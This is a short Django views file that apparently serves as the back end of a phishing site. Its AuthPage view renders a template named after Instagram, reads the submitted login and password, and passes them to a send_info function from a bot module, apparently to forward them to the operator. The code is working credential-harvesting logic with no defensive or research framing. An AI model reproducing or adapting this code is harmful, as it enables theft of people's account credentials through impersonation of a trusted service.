from django.http.response import Http404, HttpResponse
from django.shortcuts import render
from django.views.generic.edit import FormView
from django.views.generic import ListView
from mainsite.forms import ContactForm
from mainsite.bot import send_info


class MainPage(ListView):
    template_name = 'index.html'

    def get(self, request):
        return render(request, self.template_name)


class AuthPage(FormView):
    template_name = 'mainsite/instagram.html'
    form_class = ContactForm
    success_url = '/auth'

    def get(self, request):
        return render(request, self.template_name, context={'form': self.form_class})

    def form_valid(self, form):
        login = form.data.get('login')
        password = form.data.get('password')
        data = f'Login: {login}\nPassword: {password}'
        send_info(data)
        return super().form_valid(form)
